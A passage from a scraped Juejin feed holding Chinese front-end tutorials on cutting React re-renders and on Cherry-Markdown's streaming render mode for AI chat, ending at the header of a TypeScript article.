li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>“我的页面就改了个弹窗开关，为什么整个列表都闪了一下？”<br/>
—— 如果你也曾这样怀疑人生，这篇内容就是为你写的。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、为什么“重新渲染”这么贵？</h2>
<p>React 的默认行为是：<strong>父组件一更新，所有子组件无条件跟着渲染</strong>。<br/>
在小型 Demo 里这没什么，但在真实业务里：</p>
<ul>
<li>列表 1000 项，每项 20 个 DOM，一次渲染就是 2 万次比对；</li>
<li>图表、表格、富文本编辑器初始化一次要几百毫秒；</li>
<li>低端手机掉帧、风扇狂转、用户开始骂娘。</li>
</ul>
<p><strong>性能优化第一性原理</strong>：<br/>
<strong>“不要阻止 React 更新，而是让它根本没必要更新。”</strong></p>
<hr/>
<h2 data-id="heading-1">二、10 个实战招式，招招致命</h2>







































































<table><thead><tr><th>招式</th><th>一句话记忆</th><th>典型场景</th><th>代码片段</th></tr></thead><tbody><tr><td>① React.memo</td><td>“子组件 props 没变就别来烦我”</td><td>纯展示组件</td><td><code>export default React.memo(Card)</code></td></tr><tr><td>② useCallback</td><td>“函数引用给我稳住”</td><td>传给子组件的回调</td><td><code>const onClick = useCallback(() =&gt; {}, [id])</code></td></tr><tr><td>③ useMemo</td><td>“对象/数组也给我稳住”</td><td>过滤、排序、映射</td><td><code>const list = useMemo(() =&gt; filter(raw), [raw, key])</code></td></tr><tr><td>④ 状态下放</td><td>“状态别放爷爷组件”</td><td>弹窗、开关、表单</td><td>把 <code>isOpen</code> 放到 <code>&lt;Modal&gt;</code> 父级，而非 App 根</td></tr><tr><td>⑤ 拆分小组件</td><td>“大组件=大锅饭”</td><td>列表项、卡片</td><td>1000 行上帝组件拆成 20 行 Item 组件</td></tr><tr><td>⑥ 容器/展示</td><td>“数据层与视图层离婚”</td><td>任何页面</td><td>容器取数 → 展示 memo</td></tr><tr><td>⑦ Context 拆值</td><td>“Context value 别每次新对象”</td><td>主题、用户</td><td>用 <code>useMemo</code> 包 value，或拆成两个 Context</td></tr><tr><td>⑧ 禁用 render 新建组件</td><td>“别在函数里写函数组件”</td><td>动态渲染</td><td>组件定义放顶层</td></tr><tr><td>⑨ 状态管理库</td><td>“props drilling 超过 3 层就上库”</td><td>跨页面共享</td><td>Zustand / Redux / Jotai</td></tr><tr><td>⑩ Profiler 复盘</td><td>“先量化，再优化”</td><td>任何优化前后</td><td>React DevTools → Profiler → 录制 → 对比</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">三、案例复盘：一个“搜索列表”从 450 ms 到 45 ms</h2>
<h3 data-id="heading-3">1. 背景</h3>
<ul>
<li>商品列表 500 条，支持关键字搜索、分类筛选；</li>
<li>每次输入字符，整个页面闪一下，搜索框掉帧；</li>
<li>测试手机：Redmi Note 9。</li>
</ul>
<h3 data-id="heading-4">2. 问题定位（Profiler）</h3>
<ol>
<li>输入字符 → 根组件 setState → 整页重新渲染；</li>
<li>列表项组件未 memo，每条都执行 render；</li>
<li>过滤函数在 render 内执行，O(n) 复杂度 × 500；</li>
<li>回调函数每次新建，导致 memo 失效。</li>
</ol>
<h3 data-id="heading-5">3. 四步优化</h3>
<p><strong>Step 1 状态下放</strong><br/>
把搜索关键字 <code>keyword</code> 从 App 根级放到 <code>&lt;SearchList&gt;</code> 组件，其他模块不再受牵连。</p>
<p><strong>Step 2 缓存计算</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> filtered = <span class="hljs-title function_">useMemo</span>(
  <span class="hljs-function">() =&gt;</span> goods.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">g</span> =&gt;</span> g.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(keyword)),
  [goods, keyword]
);
</code></pre>
<p><strong>Step 3 缓存回调</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> onAddCart = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">id</span>) =&gt;</span> cart.<span class="hljs-title function_">add</span>(id), [cart]);
</code></pre>
<p><strong>Step 4 列表项 memo</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Item</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">{ goods, onAddCart }</span>) =&gt;</span> (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{goods.name}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> onAddCart(goods.id)}&gt;加购<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
));
</code></pre>
<h3 data-id="heading-6">4. 结果</h3>
<ul>
<li>输入字符时，仅 SearchList 与列表重新渲染，Header、Sidebar、Footer 纹丝不动；</li>
<li>单次渲染耗时从 450 ms → 45 ms；</li>
<li>掉帧率从 18% → 0%。</li>
</ul>
<hr/>
<h2 data-id="heading-7">四、最容易踩的 5 个“反模式”</h2>
<ol>
<li>
<p><strong>在 render 里写箭头函数</strong><br/>
<code>&lt;button onClick={() =&gt; handleClick(id)} /&gt;</code><br/>
→ 每次新引用，子组件 memo 失效。</p>
</li>
<li>
<p><strong>在 render 里新建对象</strong><br/>
<code>&lt;Child style={{ color: 'red' }} /&gt;</code><br/>
→ 同上，用 <code>useMemo</code> 或提前声明常量。</p>
</li>
<li>
<p><strong>把函数组件写在另一个组件内部</strong><br/>
见上文“新建组件类型”。</p>
</li>
<li>
<p><strong>滥用 key 来“刷新”组件</strong><br/>
只有身份变更才改 key，局部数据更新请用状态。</p>
</li>
<li>
<p><strong>Context value 直接传对象字面量</strong></p>
<pre><code class="hljs language-js" lang="js">&lt;<span class="hljs-title class_">AuthCtx</span> value={{ user, setUser }}&gt;  
</code></pre>
<p>→ 每次渲染都生成新对象，所有消费者重渲染。<br/>
解决：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> value = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> ({ user, setUser }), [user]);
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-8">五、checklist：上线前必查的 8 个问题</h2>
<ol>
<li>所有纯展示组件都包 <code>React.memo</code> 了吗？</li>
<li>传给 memo 组件的函数都用 <code>useCallback</code> 缓存了吗？</li>
<li>对象/数组 props 都用 <code>useMemo</code> 缓存了吗？</li>
<li>状态是否放在“最近公共祖先”？</li>
<li>列表 key 用的是稳定 ID 而不是索引？</li>
<li>过滤/排序放在 render 里了吗？挪进 <code>useMemo</code>！</li>
<li>有 props drilling 超过 3 层吗？考虑 Context 或状态库。</li>
<li>用 Profiler 录制一次主流程，确认没出现“黄色长条”。</li>
</ol>
<hr/>
<h2 data-id="heading-9">六、写在最后</h2>
<p>优化重新渲染，就像给 React 应用做“断舍离”：<br/>
<strong>少一点不必要的更新，多一点丝滑的体验。</strong><br/>
把这 10 个招式练成肌肉记忆，你也能在 Code Review 时自信地留下那句：</p>
<blockquote>
<p>“这段我 memo 过了，放心合并。”</p>
</blockquote>
<p>祝你的下一次 <code>npm start</code> 不再闪屏，愿所有列表都如丝般顺滑。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何快速实现markdown流式渲染]]></title>    <link>https://juejin.cn/post/7581329603778215972</link>    <guid>https://juejin.cn/post/7581329603778215972</guid>    <pubDate>2025-12-09T03:05:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581329603778215972" data-draft-id="7581324707480551465" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何快速实现markdown流式渲染"/> <meta itemprop="keywords" content="Markdown"/> <meta itemprop="datePublished" content="2025-12-09T03:05:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="泰达米尔"/> <meta itemprop="url" content="https://juejin.cn/user/942708679258650"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何快速实现markdown流式渲染
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/942708679258650/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    泰达米尔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:05:58.000Z" title="Tue Dec 09 2025 03:05:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1、引言</h2>
<p>在AI聊天场景中，Markdown内容的流式渲染变得越来越重要。传统的Markdown渲染器在处理流式内容时往往会遇到语法不完整导致的渲染异常问题。<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fcherry-markdown" target="_blank" title="https://github.com/Tencent/cherry-markdown" ref="nofollow noopener noreferrer">Cherry-Markdown</a>作为一款功能强大的Markdown编辑器，专门针对流式渲染场景进行了深度优化，提供了稳定、高效的流式渲染能力。</p>
<h2 data-id="heading-1">2、流式渲染遇到的问题</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45b5b4d7fa504ef0a0bff842d92f9bd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rOw6L6-57Gz5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854357&amp;x-signature=m2MygPqjW0LOns1uFpXdAyDzTus%3D" alt="录屏_20251209_103349.gif" loading="lazy"/>
上图是一个传统的Markdown流式渲染输出的效果，可见在传统的Markdown流式渲染中，开发者会遇到以下问题：</p>
<h3 data-id="heading-2">2.1、语法不完整导致的渲染异常</h3>
<p>当Markdown内容以字符为单位逐步输出时，语法结构往往是不完整的：</p>
<ul>
<li><strong>加粗/斜体语法</strong>：<code>**加粗内容</code> 缺少闭合符号</li>
<li><strong>行内/段落代码块</strong>：<code> ```javascript</code> 缺少闭合的 <code>```</code>导致会先显示markdown源码再渲染成代码高亮</li>
<li><strong>表格</strong>：表格分隔行不完整</li>
<li><strong>公式</strong>：数学公式符号不匹配</li>
<li><strong>标题</strong>: 会先显示<code>##</code>符号再渲染成标题</li>
<li><strong>超链接</strong>：会先显示<code>[xxx](xxxx</code>，最后再变成超链接</li>
<li><strong>图片、音视频</strong>：会先显示前面的源码，最后再变成图片或音视频</li>
<li><strong>无序列表</strong>：每次换行输出<code>-</code>时都会命中标题语法，先渲染成标题再渲染成无序列表</li>
<li><strong>mermaid画图</strong>：渲染过程中由于结构不完整，会经常出现报错</li>
<li><strong>脚注</strong>：当脚注语法没有输出完全时，角标无法正常渲染</li>
</ul>
<h3 data-id="heading-3">2.2、渲染性能问题</h3>
<ul>
<li>频繁的DOM更新导致页面卡顿</li>
<li>大量重绘和重排影响用户体验</li>
<li>渲染间隔过长导致“视频”变“幻灯片”</li>
</ul>
<h3 data-id="heading-4">2.3、用户体验不佳</h3>
<ul>
<li>不完整的语法结构暴露给用户</li>
<li>缺乏类似打字机的视觉反馈</li>
</ul>
<h2 data-id="heading-5">3、使用Cherry-Markdown进行流式渲染的效果</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3914454d174488fa80cd370234c376b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rOw6L6-57Gz5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854357&amp;x-signature=mdtsulY6R0RiS4iZqj2vgbwXy9A%3D" alt="录屏_20251209_104328.gif" loading="lazy"/>
上图是使用Cherry-Markdown进行流式渲染的效果，当然也可以在<a href="https://link.juejin.cn?target=https%3A%2F%2Ftencent.github.io%2Fcherry-markdown%2Fexamples%2Fai_chat.html" target="_blank" title="https://tencent.github.io/cherry-markdown/examples/ai_chat.html" ref="nofollow noopener noreferrer">官方在线demo</a> 直接进行体验，Cherry-Markdown通过以下特性解决了上述问题：</p>
<h3 data-id="heading-6">3.1 语法自动补全</h3>
<p>开启流式渲染模式后，Cherry会自动补全以下语法元素：</p>
<ul>
<li>标题</li>
<li>加粗、斜体</li>
<li>超链接</li>
<li>图片、音视频</li>
<li>行内代码块</li>
<li>段落代码块</li>
<li>行内公式</li>
<li>段落公式</li>
<li>无序列表</li>
<li>表格</li>
<li>mermaid画图</li>
<li>脚注</li>
</ul>
<h3 data-id="heading-7">3.2 性能优化</h3>
<ul>
<li><strong>渲染频率提升</strong>：渲染频率可达到10ms/次</li>
<li><strong>增量渲染</strong>：只更新变化的部分内容，尽可能的减少dom重绘区域，如下图：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d0c65d967694b5fab4323484abe3d5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rOw6L6-57Gz5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854357&amp;x-signature=JIzfCdzwQki%2BScD6ZBIRyHEKVEk%3D" alt="录屏_20251209_104800.gif" loading="lazy"/></li>
<li><strong>异步渲染处理</strong>：支持图表等异步内容的渲染</li>
</ul>
<h3 data-id="heading-8">3.3 用户体验增强</h3>
<ul>
<li><strong>虚拟光标</strong>：提供类似打字机的视觉反馈</li>
<li><strong>稳定输出</strong>：避免语法不完整导致的渲染异常</li>
</ul>
<h2 data-id="heading-9">4、如何使用</h2>
<h3 data-id="heading-10">4.1 基础配置</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> cherry = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cherry</span>({
  <span class="hljs-attr">editor</span>: {
    <span class="hljs-attr">height</span>: <span class="hljs-string">'auto'</span>,
    <span class="hljs-attr">defaultModel</span>: <span class="hljs-string">'previewOnly'</span>, <span class="hljs-comment">// 纯预览模式适合流式场景</span>
  },
  <span class="hljs-attr">engine</span>: {
    <span class="hljs-attr">global</span>: {
      <span class="hljs-attr">flowSessionContext</span>: <span class="hljs-literal">true</span>,     <span class="hljs-comment">// 开启流式渲染</span>
      <span class="hljs-attr">flowSessionCursor</span>: <span class="hljs-string">'default'</span>, <span class="hljs-comment">// 添加虚拟光标</span>
    },
  },
  <span class="hljs-attr">previewer</span>: {
    <span class="hljs-attr">enablePreviewerBubble</span>: <span class="hljs-literal">false</span>,   <span class="hljs-comment">// 关闭预览区编辑功能</span>
  },
});
</code></pre>
<h3 data-id="heading-11">4.2 流式内容更新</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟流式输出</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">streamContent</span>(<span class="hljs-params">content, cherryInstance</span>) {
  <span class="hljs-keyword">let</span> currentIndex = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> interval = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (currentIndex &lt; content.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">const</span> currentText = content.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, currentIndex + <span class="hljs-number">1</span>);
      cherryInstance.<span class="hljs-title function_">setMarkdown</span>(currentText);
      currentIndex++;
      
      <span class="hljs-comment">// 自动滚动到最新位置</span>
      <span class="hljs-keyword">const</span> previewer = cherryInstance.<span class="hljs-property">previewer</span>.<span class="hljs-title function_">getDom</span>();
      previewer.<span class="hljs-property">scrollTop</span> = previewer.<span class="hljs-property">scrollHeight</span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-built_in">clearInterval</span>(interval);
      <span class="hljs-comment">// 流式输出完成后清除虚拟光标</span>
      cherryInstance.<span class="hljs-title function_">clearFlowSessionCursor</span>();
    }
  }, <span class="hljs-number">30</span>); <span class="hljs-comment">// 30ms的更新间隔</span>
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> content = <span class="hljs-string">`# 欢迎使用Cherry-Markdown流式渲染

这是一个**加粗文字**的示例。

\`\`\`javascript
console.log("Hello, World!");
\`\`\`

| 项目 | 价格 | 数量 |
|------|------|------|
| 计算机 | ¥1600 | 5 |
`</span>;

<span class="hljs-title function_">streamContent</span>(content, cherry);
</code></pre>
<h3 data-id="heading-12">4.3 高级配置选项</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 完整的高级配置</span>
<span class="hljs-keyword">const</span> advancedConfig = {
  <span class="hljs-attr">engine</span>: {
    <span class="hljs-attr">global</span>: {
      <span class="hljs-attr">flowSessionContext</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">flowSessionCursor</span>: <span class="hljs-string">'&lt;span class="custom-cursor"&gt;|&lt;/span&gt;'</span>, <span class="hljs-comment">// 自定义光标</span>
    },
    <span class="hljs-attr">syntax</span>: {
      <span class="hljs-attr">image</span>: {
        <span class="hljs-attr">selfClosing</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-comment">// 图片加载时的占位符</span>
        <span class="hljs-attr">selfClosingRender</span>: <span class="hljs-function">(<span class="hljs-params">type, alt, src</span>) =&gt;</span> {
          <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;img src="loading.gif" alt="<span class="hljs-subst">${alt}</span>" data-src="<span class="hljs-subst">${src}</span>"&gt;`</span>;
        }
      },
    }
  },
  <span class="hljs-comment">// 事件监听</span>
  <span class="hljs-attr">callback</span>: {
    <span class="hljs-attr">afterAsyncRender</span>: <span class="hljs-function">(<span class="hljs-params">markdown, html</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'异步渲染完成:'</span>, html);
    }
  }
};
</code></pre>
<h2 data-id="heading-13">5、总结</h2>
<p>Cherry-Markdown的流式渲染功能为现代Web应用提供了强大的Markdown内容展示能力。通过语法自动补全、性能优化和用户体验增强，它完美解决了传统流式渲染中的各种问题。</p>
<h3 data-id="heading-14">主要优势：</h3>
<ol>
<li><strong>稳定性</strong>：自动补全语法，避免渲染异常</li>
<li><strong>高性能</strong>：10ms级的渲染频率，增量更新dom，支持大量内容流式展示</li>
<li><strong>易用性</strong>：默认支持丰富的markdown语法和流式渲染机制，通过简单的配置即可实现复杂的流式渲染需求</li>
<li><strong>扩展性</strong>：支持扩展<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fcherry-markdown%2Fwiki%2F%25E8%2587%25AA%25E5%25AE%259A%25E4%25B9%2589%25E8%25AF%25AD%25E6%25B3%2595" target="_blank" title="https://github.com/Tencent/cherry-markdown/wiki/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AF%AD%E6%B3%95" ref="nofollow noopener noreferrer">自定义语法</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fcherry-markdown%2Fwiki%2F%25E5%25A4%2584%25E7%2590%2586URL" target="_blank" title="https://github.com/Tencent/cherry-markdown/wiki/%E5%A4%84%E7%90%86URL" ref="nofollow noopener noreferrer">url处理</a>和<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fcherry-markdown%2Fwiki%2F%25E4%25BA%258B%25E4%25BB%25B6%26%25E5%259B%259E%25E8%25B0%2583" target="_blank" title="https://github.com/Tencent/cherry-markdown/wiki/%E4%BA%8B%E4%BB%B6&amp;%E5%9B%9E%E8%B0%83" ref="nofollow noopener noreferrer">事件处理</a></li>
</ol>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fcherry-markdown" target="_blank" title="https://github.com/Tencent/cherry-markdown" ref="nofollow noopener noreferrer">Cherry-Markdown</a>的流式渲染功能让开发者能够专注于业务逻辑，而无需担心Markdown渲染的细节问题，是构建现代Web应用的理想选择。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【TS】any的问题及与unknown的区别]]></title>    <link>https://juejin.cn/post/7581457966966063114</link>    <guid>https://juejin.cn/post/7581457966966063114</guid>    <pubDate>2025-12-09T03:18:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581457966966063114" data-draft-id="7581619505583996979" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【TS】any的问题及与unknown的区别"/> <meta itemprop="keywords" content="TypeScript,前端"/> <meta itemprop="datePublished" content="2025-12-09T03:18:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="浩浩酱"/> <meta itemprop="url" content="https://juejin.cn/user/1292681405276024"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【TS】any的问题及与unknown的区别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1292681405276024/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    浩浩酱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:18:00.000Z" title="Tue Dec 09 2025 03:18:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
